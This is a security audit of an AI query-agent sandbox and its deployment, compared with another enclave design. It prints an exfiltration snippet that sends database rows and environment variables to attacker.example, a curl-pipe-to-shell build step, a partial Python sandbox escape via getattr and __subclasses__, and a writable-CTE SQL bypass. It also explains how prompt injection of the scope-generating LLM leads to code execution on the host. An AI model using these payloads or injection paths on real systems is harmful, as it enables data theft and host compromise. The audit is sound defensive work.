# Hivemind-Core Security Audit — April 2026

Investigation of the query-agent sandbox: how a malicious user-supplied
Docker image submitted via `POST /v1/query-agents/submit` is constrained from
exfiltrating data, escaping the container, draining LLM budget, or
interfering with concurrent runs. Includes a structural compare/contrast
with the `oauth3-enclave` sandbox, which solves a related problem with a
very different mental model.

All claims below cite file:line against the tree at the time of writing.
Re-verify before acting if the code has moved.

---

## Threat model

An attacker holds an API key for `/v1/query-agents/submit` and uploads a tar
archive containing a `Dockerfile` plus arbitrary source files. The hivemind
host:

1. Extracts the archive.
2. Runs `docker build` against the host's docker daemon.
3. Registers an `AgentConfig` for the resulting image.
4. Spawns an agent container, attaches it to a docker network, and starts a
   per-session "bridge server" that proxies LLM calls and exposes
   `execute_sql`/`get_schema` tools to the container.
5. The container runs to completion, the bridge stops, the container is
   removed.

Goals the operator wants the sandbox to enforce:

- **Data confinement.** The agent must not see any rows the scope function
  hasn't explicitly allowed.
- **Network confinement.** The container must not be able to exfiltrate to
  arbitrary internet hosts.
- **Host isolation.** The container must not be able to escape to the CVM
  host or interfere with other containers.
- **Budget enforcement.** LLM calls must be metered and capped.
- **Cross-tenant isolation.** Concurrent runs must not be able to read or
  influence each other.

---

## Findings

### 1. CRITICAL — Egress enforcement is disabled in production

**Status: confirmed.**

Defaults in `hivemind/config.py:28-30` are secure:

```python
docker_network_internal: bool = True
enforce_bridge_only_egress: bool = True
enforce_bridge_only_egress_fail_closed: bool = True
```

The live CVM compose file overrides both
(`deploy/docker-compose.cvm.yaml:40-41`, mirrored in
`deploy/phala/docker-compose.core.yaml:33-34`):

```yaml
HIVEMIND_DOCKER_NETWORK_INTERNAL: "false"
HIVEMIND_ENFORCE_BRIDGE_ONLY_EGRESS: "false"
```

`docker_runner.py:548` only installs the iptables `DOCKER-USER` rules when
`enforce_bridge_only_egress` is true. With both flags off:

- Agent containers attach to a normal NAT'd docker bridge with default
  egress, i.e. they have **arbitrary internet access**.
- The host gateway is reachable, so a container can reach any port the CVM
  exposes on `127.0.0.1` from the host's perspective. Combined with the
  postgres container running on `network_mode: host`, that includes
  postgres itself.
- The bridge server binds to `0.0.0.0` (`HIVEMIND_BRIDGE_HOST` in the same
  compose file), so any container on the docker network can reach any
  active bridge port — see finding #5.

What an attacker can do today:

```dockerfile
FROM python:3.11-slim
COPY agent.py /agent.py
CMD ["python", "/agent.py"]
```
```python
# agent.py
import os, requests
# ...do whatever queries the scope_fn allows...
requests.post("https://attacker.example/exfil",
              json={"rows": collected_rows, "env": dict(os.environ)})
```

The exfiltrated rows are limited to what the scope function let through,
so this isn't a full data dump unless the scope function is permissive.
But it does mean every privacy claim that depends on "the agent has no way
to phone home" is currently false on the deployed CVM.

**Historical context.** The deploy notes record that this was disabled
during the original CVM bring-up because the iptables binary isn't in the
`python:3.11-slim` base image and the internal network blocked the bridge
on Linux. Both are fixable: bake `iptables` into the deploy image and
make sure the bridge URL resolved by `_resolve_bridge_url` (`docker_runner.py:218`)
points to the docker network gateway, not the host's external interface.

**Severity:** the most consequential finding in the audit. Every other
defence-in-depth layer assumes this one is in place.

---

### 2. HIGH — Scope-function sandbox: timeout unwired and `getattr` escape

**Status: both confirmed.**

#### 2a. `SCOPE_FN_TIMEOUT` is dead code

Defined at `hivemind/scope.py:51`:

```python
SCOPE_FN_TIMEOUT = 5  # seconds
```

Grepping the entire `hivemind/` tree finds zero references outside this
definition. No `signal.alarm`, no `threading.Timer`, no `asyncio.wait_for`
wrapper. `apply_scope_fn` (`scope.py:151-186`) calls `scope_fn(sql, params, rows)`
directly. A scope function containing `while True: pass` or a recursive
explosion will hang the worker thread until the outer agent timeout
(`agent_timeout: int = 300`) reaps the whole pipeline.

#### 2b. `getattr`/`hasattr` escape

`_SCOPE_BUILTINS` exposes `getattr` and `hasattr` (`scope.py:46-47`). The
AST safety walk at `scope.py:121-135` rejects:

- `ast.Import` and `ast.ImportFrom`
- `ast.Call` whose `.func` is an `ast.Name` in `_FORBIDDEN_CALLS`
  (`exec`, `eval`, `compile`, `__import__`, `open`, …)
- `ast.Attribute` nodes whose `.attr` starts and ends with `__`

The third check inspects *attribute access syntax*, not function call
arguments. The string `"__class__"` passed to `getattr` is an
`ast.Constant`, not an `ast.Attribute`, so this passes validation:

```python
def scope(sql, params, rows):
    cls = getattr(rows[0] if rows else {}, "__class__")
    bases = getattr(cls, "__mro__")
    subs = getattr(bases[-1], "__subclasses__")()
    # walk subs to find os._wrap_close, subprocess.Popen, etc.
    return {"allow": True, "rows": rows}
```

From `__subclasses__()` it's the standard CPython escape: find a class
whose `__init__.__globals__` contains `os` or `subprocess`, then call
whatever you want.

**Where the scope function actually runs.** This is the part that changes
the severity calculation. `scope_fn` is the row-filter callback inside
the SCOPED `execute_sql` tool (`hivemind/tools.py:124-135`). That tool
handler runs in the **host hivemind-core process**, not in the agent
container. So escape from the scope-fn namespace gives in-process Python
execution as the FastAPI server, with:

- Full database access (the tool handler holds a `Database` reference).
- The upstream LLM provider key.
- The host docker socket (see finding #4).
- The ability to read every other run's state.

**Where the scope function comes from.** The scope-fn source is parsed
out of the scope agent's LLM output at `hivemind/pipeline.py:283-291`:

```python
data = json.loads(raw.strip())
if "scope_fn" in data:
    source = data["scope_fn"]
    fn = compile_scope_fn(source)
    return fn, usage
```

The scope agent is operator-trusted today, so the practical attack path is
**prompt injection of the scope agent**. The scope agent has FULL_READ DB
access (`pipeline.py:255`) plus access to the query-agent's source files
(`pipeline.py:259-261`). An attacker who controls any data either of those
sources reads gets to influence what scope-fn source the scope LLM emits.
A successful injection gives in-process RCE on hivemind-core, which
bypasses every layer of the query-agent sandbox.

#### Test gap

`tests/test_scope.py:165` only exercises the literal-attribute form
(`rows.__class__.__name__`), which is correctly blocked by the AST check.
There is no test for `getattr("__class__")` and no test for the
infinite-loop / wall-clock case.

#### Fixes

- Drop `getattr` and `hasattr` from `_SCOPE_BUILTINS`. Nothing legitimate
  in a row-filter function needs them.
- Wire the timeout. `signal.alarm` won't work because tool handlers run
  off the main thread inside `asyncio.to_thread`; use a worker thread
  with a join deadline, or run scope_fn in a subprocess.
- Add escape-attempt tests covering at minimum:
  `getattr(x, "__class__")`, `hasattr(x, "__class__")`, and infinite loops.

---

### 3. MEDIUM — SQL filter robustness

`hivemind/tools.py:55-81` implements two checks:

```python
def _is_select_only(sql: str) -> bool:
    statements = sqlglot.parse(sql, error_level=sqlglot.ErrorLevel.RAISE)
    for stmt in statements:
        if not isinstance(stmt, sqlglot.exp.Select):
            return False
    return True

def _references_internal_tables(sql: str) -> bool:
    upper = sql.upper()
    return "_HIVEMIND_" in upper
```

#### 3a. Possible CTE-DML bypass — needs verification

Postgres supports writable CTEs:

```sql
WITH ins AS (INSERT INTO real_table VALUES (1) RETURNING *)
SELECT * FROM ins;
```

sqlglot parses this with the *outer* statement as `Select` (the WITH
expression is a child). The `isinstance(stmt, sqlglot.exp.Select)` check
inspects only the outer statement; there's no recursive walk for nested
DML. If sqlglot does parse this as `Select`, the SCOPED query agent can
write to arbitrary tables despite the "SELECT only" advertised
restriction.

Verification step (one-liner):

```python
import sqlglot
print(sqlglot.parse(
    "WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x"
)[0].__class__.__name__)
```

If the result is `Select`, this is a confirmed bypass.

#### 3b. `SELECT … INTO`

Postgres `SELECT … INTO new_table` creates a new table. sqlglot may parse
it as a `Select`. Worth a similar one-line check.

#### 3c. Substring check is over-broad, not under-broad

`_references_internal_tables` matches `_HIVEMIND_` in the upper-cased SQL
text. False positives on user data containing the string ("hello,
\_HIVEMIND\_!" in a string literal) are blocked unnecessarily, but I can't
construct a false negative — the substring is short enough that
identifier quoting (`"_hivemind_query_runs"`), schema qualification
(`public._hivemind_query_runs`), and comment injection all still contain
the substring after upper-casing.

#### Fix

Replace both checks with an AST walk:

```python
def _is_safe_select(sql: str) -> bool:
    try:
        statements = sqlglot.parse(sql, error_level=sqlglot.ErrorLevel.RAISE)
    except sqlglot.errors.ParseError:
        return False
    if not statements:
        return False
    forbidden = (sqlglot.exp.Insert, sqlglot.exp.Update, sqlglot.exp.Delete,
                 sqlglot.exp.Drop, sqlglot.exp.Create, sqlglot.exp.AlterTable)
    for stmt in statements:
        if not isinstance(stmt, sqlglot.exp.Select):
            return False
        for node in stmt.walk():
            if isinstance(node, forbidden):
                return False
            if isinstance(node, sqlglot.exp.Table):
                if node.name.lower().startswith("_hivemind_"):
                    return False
    return True
```

Add test cases for CTE-DML, `SELECT INTO`, quoted identifiers, and
schema-qualified internal table references.

---

### 4. CRITICAL CONTEXT — Docker socket from the host is mounted into hivemind-core

**Status: confirmed; affects severity of every other finding.**

The architecture diagrams describe this as "Docker-in-Docker", but
`deploy/docker-compose.cvm.yaml:45` and `:66` mount
`/var/run/docker.sock:/var/run/docker.sock` from the host into both the
hivemind-core container and the SSH debug sidecar.

Mounting the host docker socket into a container is equivalent to giving
that container root on the host. Inside a CVM the "host" is the dstack
guest VM, so the operator already trusts the hivemind-core process, but
the implications cascade:

- An RCE in hivemind-core (e.g., the scope-fn escape from finding #2)
  inherits full docker daemon control. The attacker can start any image,
  bind-mount any host path, attach to any network. The "agent container
  is sandboxed" boundary doesn't survive RCE in the orchestrator.
- The `docker build` invocation at `docker_runner.py:706` runs the
  attacker's `Dockerfile` against the *real* host docker daemon. Standard
  builds aren't privileged, but `RUN curl http://attacker/ | sh` during
  build will execute attacker code with the daemon's default build-time
  privileges, with network access (the build network is separate from the
  agent runtime network and is not subject to the iptables rules in
  finding #1, even when those rules are enabled).
- BuildKit's `RUN --security=insecure` requires the daemon to be
  configured with `insecure-entitlements`. Worth confirming that the CVM
  daemon does not enable this.
- The SSH debug sidecar on port 2222 with a static password (per the
  deploy notes) shares the same docker socket. Anyone who reaches that
  port has root on the CVM.

**Mitigations to consider:**

- Use a rootless or BuildKit-in-namespace setup so the build is not
  bound to the host daemon.
- Drop the SSH sidecar from production deployments, or at minimum bind
  it to a non-routable interface and rotate the password.
- Document loudly in `AUDIT.md` that the agent-container boundary
  collapses on hivemind-core RCE.

---

### 5. MEDIUM — Bridge server binds to 0.0.0.0 with unauthenticated `/health`

`HIVEMIND_BRIDGE_HOST: "0.0.0.0"` (`deploy/docker-compose.cvm.yaml:39`),
combined with `network_mode: host` and `internal=false`, means each
ephemeral bridge server (one per agent run) is reachable from any
container on the docker network and from any IP that can route to the
CVM's external interface.

Per-session isolation primitives are in place:

- Each `BridgeServer` gets a random urandom port via `uvicorn.Config(port=0)`
  (`bridge.py:654`).
- Each session has a 32-byte `secrets.token_urlsafe` token, validated with
  `secrets.compare_digest` (`bridge.py:325-333`).
- `_enforce_scope_query_agent` (`bridge.py:335`) confines a scope session
  to its declared query-agent target.

But `/health` is unauthenticated and leaks the budget summary
(`bridge.py:345-347`):

```python
@app.get("/health")
async def health():
    return {"status": "ok", "budget": bridge.budget.summary()}
```

What this enables:

- A malicious agent in run A can scan ports on the host gateway and
  enumerate active bridges for runs B, C, D.
- For each one it can read the live token/call counts. Side channel
  into other tenants' usage and timing.
- Token brute-force is infeasible (256 bits), so it can't *call* other
  bridges' tools — only enumerate them.

#### Fix

Either gate `/health` behind the session token, or trim the response to
`{"status": "ok"}` and expose budget summary on a token-gated endpoint.
Cost: trivial.

---

### 6. NOT EXPLOITABLE — Tape replay budget bypass

Initially flagged as a possible budget-bypass vector. After tracing it,
not exploitable from the query-agent side.

The replay tape is supplied via `SimulateRequest.replay_tape` to
`/sandbox/simulate`, and that endpoint is only mounted when
`bridge.role == "scope"` (`bridge.py:509`). The query agent's bridge
never has a `/sandbox/simulate` route and never has a way to inject a
`replay_tape` into its own `BridgeServer` constructor — that parameter
is set by `SandboxBackend.run` based on the caller, which is `Pipeline`.

Replays do bypass budget at `bridge.py:285-291`, but only for sessions
that already had a tape installed at construction time. The accounting
is correct: the tape was recorded against the scope agent's budget on
its first execution; replaying it during simulation correctly does not
double-charge.

The residual concern is **scope-agent prompt injection** (see finding
#2): if the scope LLM can be induced to call `/sandbox/simulate` with
attacker-crafted inputs, it burns scope-agent budget but doesn't escape
the budget envelope. Mark this one mitigated.

---

### 7. Lower-severity observations

- **No image cleanup on failure or after run.** `_build_and_run`
  (`server.py:906`) builds an image and registers an agent, but I didn't
  find a code path that removes the image afterwards. A long-lived CVM
  accumulates attacker-uploaded images indefinitely. Disk pressure plus
  inventory bloat. Low severity.
- **`extract_image_files`** (`docker_runner.py:736`) creates a stopped
  container and reads `/app` out via `get_archive`. Tarbomb mitigation
  (`max_archive_size=50_000_000`) is present and the streamed read uses
  a `SpooledTemporaryFile` with a 4MB memory cap. Looks correct.
- **`_safe_extract_tar`** (called at `server.py:869`) handles upload
  archive extraction. I did not read it as part of this audit. Standard
  tar-slip checklist applies: rejection of `..` components, absolute
  paths, and symlinks.
- **No per-tenant rate limit on `/v1/query-agents/submit`.** Each call
  spawns a background `asyncio.create_task` (`server.py:880`) that
  builds a docker image. A single API key holder can fill the build
  queue, consuming CPU and disk. Low severity, but worth a semaphore.
- **`OPENAI_API_KEY`/`ANTHROPIC_API_KEY` are set to the session token in
  the container env** (`docker_runner.py:481-483`). This is intentional —
  the container thinks it's talking to OpenAI/Anthropic but is actually
  talking to the bridge — and the leaked token only grants access the
  agent already has. Worth a comment in the code so future readers don't
  flag it as a credential leak.
- **S3 upload endpoint** (`bridge.py:606`) lets a query agent push
  base64-encoded blobs to the configured bucket under `{run_id}/{filename}`
  with no content validation. Not a bug — it's the documented egress
  channel for query results — but worth knowing that the R2 bucket is a
  write-only sink whose contents are entirely attacker-controlled.

---

## Compare and contrast: oauth3-enclave

`~/projects/oauth3` solves a related problem (sandboxing untrusted
code with mediated access to secrets and APIs) with a fundamentally
different mental model. Both projects run inside Phala dstack CVMs on
Intel TDX, both derive storage keys from dstack KMS, both have a "bridge
or endowment" layer that mediates the untrusted code's access to
secrets. They diverge on the unit of trust.

### Side-by-side

| Dimension | hivemind-core | oauth3-enclave |
|---|---|---|
| **Trust unit** | A whole Docker image (any language, any binary) | A single JS function in a SES Compartment |
| **Sandbox primitive** | Linux container: cap_drop, no-new-priv, read-only fs, mem/cpu/pid limits, separate netns | SES `Compartment` with `harden()`-ed endowments — JS realm only, no OS isolation |
| **What untrusted can call** | Bridge HTTP server with `execute_sql` + `get_schema` + LLM proxy | Capability functions injected as endowments (`scoped-fetch`, custom plugins) |
| **What untrusted can't do** | Direct network (when iptables enabled), syscalls outside container, unauthorized SQL | Direct `fetch`, file I/O, env access, `process`, `require`, `globalThis` — none of these exist inside the Compartment |
| **Network confinement** | Docker network + iptables (when enabled) | No network primitive at all — all I/O *must* go through capability functions |
| **Data filter** | Compiled Python `scope_fn` (AST-validated) does post-query row filtering | `scoped-fetch` plugin enforces path globs / methods / body schemas pre-call |
| **LLM in security path** | LLMs *generate* the scope function source; `scope.py` AST-checks and `exec`s it; budget enforced via bridge | LLM (Haiku, inside the TEE) drafts capability *specs* from human intent; **no LLM-generated code at enforcement time** |
| **Human approval surface** | Operator pre-registers scope/query/mediator agents; users submit query agents under an API key | Per-intent approval flow: user approves "create issues on owner/repo" via the proxy-orchestrator UI; permit becomes a signed capability spec |
| **Persistence** | Postgres for user data + `_hivemind_query_runs` for run state | KV `store` per capability + Postgres for audit logs |
| **Storage encryption** | LUKS2 (mentioned in `ARCHITECTURE.md`) | LUKS2 + dstack KMS-derived disk key (instance-bound, `oauth3-enclave/SECURITY.md:8-25`) |
| **Replay primitive** | Tape recording — scope agent uses it to dry-run query agent during scope synthesis (`hivemind/sandbox/tape.py`) | Audit logs only, no deterministic replay |

### Key oauth3 files

- `oauth3-enclave/proxy/src/executor.ts:1-72` — SES Compartment setup,
  hardened endowments, 30s wall-clock timeout via `Promise.race`.
- `oauth3-enclave/proxy/src/plugins/scoped-fetch.ts:14-156` — capability
  generator: path glob matching, method whitelist, body schema
  enforcement, rate limits, secret injection at call time.
- `oauth3-enclave/proxy/src/plugins/custom.ts:29-43` — owner-authored
  capability code, also runs in Compartment.
- `oauth3-enclave/proxy/src/server.ts:478-514` — `/permit` flow:
  human-approved intent → trusted in-TEE LLM drafts spec → plugin
  validates → spec compiles to deterministic capability function.
- `oauth3-enclave/SECURITY.md:8-25` — LUKS2 + dstack KMS key derivation.

### Where oauth3 is structurally stronger

1. **The trust unit is much smaller.** A Compartment running a 50-line
   JS function with three injected endowments is vastly easier to audit
   than "any Docker image the user uploaded plus everything in its base
   layer." Hivemind's surface includes the Linux kernel, the docker
   daemon, every package the attacker put in their image, and the bridge
   server. oauth3's surface is the SES library, the V8 realm, and the
   capability functions you authored.

2. **Capability-oriented network access.** `scoped-fetch` lets the
   operator declare "this capability can `GET repos/*/issues` with auth
   `Bearer ${secret}`, max 10 calls/min". The agent code never sees the
   secret, never sees `fetch`, can't hit any URL outside the glob.
   Hivemind's equivalent is "the container has no network, except it
   can talk to the bridge — except in production it can also talk to
   the whole internet because the firewall is off." The oauth3 design
   is enforcement-by-construction; hivemind's depends on a separate
   layer (iptables) staying healthy at runtime.

3. **The LLM is out of the enforcement path.** This is the most
   interesting design choice. In hivemind, the LLM emits scope-function
   *source code*, the AST validator is the only line of defence, and
   that defence has at least one hole (finding #2). In oauth3 the LLM
   drafts a *spec* (a JSON document), the human reviews it, and the
   enforcement is a mechanical interpretation of the spec by hand-written
   code in `scoped-fetch.ts`. You can prompt-inject the LLM as much as
   you like; the worst case is "the spec it drafts is bad and the human
   approves it anyway." There is no code path where an LLM-generated
   string is `exec`'d. Hivemind, by contrast, calls
   `compile(tree, "<scope_fn>", "exec"); exec(code, namespace)` at
   `scope.py:139-140` on LLM output every single query.

### Where hivemind is structurally stronger

1. **Hivemind's threat model is harder.** It hosts arbitrary
   user-supplied analytics code that needs a real Python runtime, NumPy,
   pandas, whatever. oauth3 only hosts very small "do this API call"
   snippets. You can't reasonably SES-sandbox a 500-line pandas
   analysis; the OS-level container is the right tool when the trust
   unit has to be a real program.

2. **SQL row filtering is something oauth3 doesn't attempt.** The whole
   `AccessLevel.SCOPED` + post-query `scope_fn` row-filter pattern is
   hivemind-specific, and it's the actual privacy-preserving primitive.
   oauth3 passes complete API responses back to the agent — there's no
   equivalent of "let the agent see aggregates but not raw rows."

3. **Tape recording for replay/audit.** `hivemind/sandbox/tape.py` gives
   a deterministic re-run primitive: the scope agent uses it to dry-run
   the query agent during scope synthesis, and operators can replay
   sessions for forensic audit. oauth3 has audit logs but no replay.

4. **Per-stage budget reservation.** The mediator-budget-reserve dance
   in `pipeline.py:108-113` (carve out tokens for the mediator before
   letting the query agent loose) is small but real hardening. oauth3's
   capability rate limits are per-capability, not pipeline-aware.

### Convergence

Both projects ended up with the same shape at the highest level:

1. TEE for hardware confidentiality.
2. KMS-derived keys bound to instance/app identity.
3. A "bridge" or "endowment" layer that mediates untrusted code's access
   to secrets and the outside world.
4. Per-session credentials so a compromised untrusted unit only damages
   one session.
5. Human approval before capabilities/agents become live.

They diverged on **what "untrusted code" means**: oauth3 says "the
smallest possible JS function with the smallest possible capability
surface, and we'll have many of them"; hivemind says "a whole Docker
image because the user is doing real data analysis, and we'll harden
the container plus filter the SQL output." The oauth3 model is much
easier to audit. The hivemind model is much more expressive.

### Things hivemind could borrow from oauth3

- **Get the LLM out of the enforcement path.** Have the scope agent
  emit a *declarative* spec (JSON: "allow these tables, require GROUP
  BY on these columns, k-anonymity threshold N") that a hand-written
  interpreter applies, instead of LLM-emitted Python that gets `exec`'d.
  Lose some flexibility, gain a lot of auditability. This single change
  would eliminate finding #2 entirely.
- **Treat the bridge token as a capability, not a credential.** Per-tool
  tokens, not a single session token that grants access to everything
  via `/llm/chat` AND `/tools/execute_sql`.
- **Move the "what URLs can the agent reach" decision into the bridge
  instead of into iptables.** Then it works regardless of whether the
  operator remembered to set `internal=true`, and it works on non-Linux
  dev environments.

### Things oauth3 could borrow from hivemind

- **Tape recording.** Audit-log-only can't replay a session
  deterministically.
- **Resource limits.** oauth3's only limit is a 30s wall-clock; a
  misbehaving Compartment can spin a CPU and OOM the Node process.
  Hivemind's per-container `mem_limit` / `nano_cpus` / `pids_limit`
  pattern is the right model.

---

## Recommended next steps for hivemind

In rough priority order:

1. **Verify the CTE-DML bypass** (finding #3a) with the one-line sqlglot
   test. If positive, harden `_is_select_only` to walk for nested DML
   per the suggested fix.
2. **Drop `getattr`/`hasattr` from `_SCOPE_BUILTINS`** and add
   escape-attempt tests (finding #2b). Wire up the timeout (use a
   worker thread, not `signal.alarm` — the tool handler runs off the
   main thread).
3. **Decide on egress enforcement** (finding #1). Either fix the
   iptables-in-image issue and turn enforcement back on, or move the
   network policy into the bridge so it doesn't depend on host
   firewall state.
4. **Gate `/health`** behind the session token, or strip the budget
   summary out of the unauthenticated response (finding #5).
5. **Audit `_safe_extract_tar`** for tar-slip and symlink handling.
6. **Add a concurrency cap** on `submit_query_agent` background builds.
7. **Document in `AUDIT.md`** that the docker-socket mount means
   hivemind-core RCE collapses the agent-container isolation boundary
   (finding #4).

The largest structural improvement, if you're willing to take it, is
**removing LLM-generated code from the enforcement path** by replacing
`scope_fn` source with a declarative spec interpreted by hand-written
Python. That eliminates finding #2 by construction and makes the
privacy story much easier to audit.
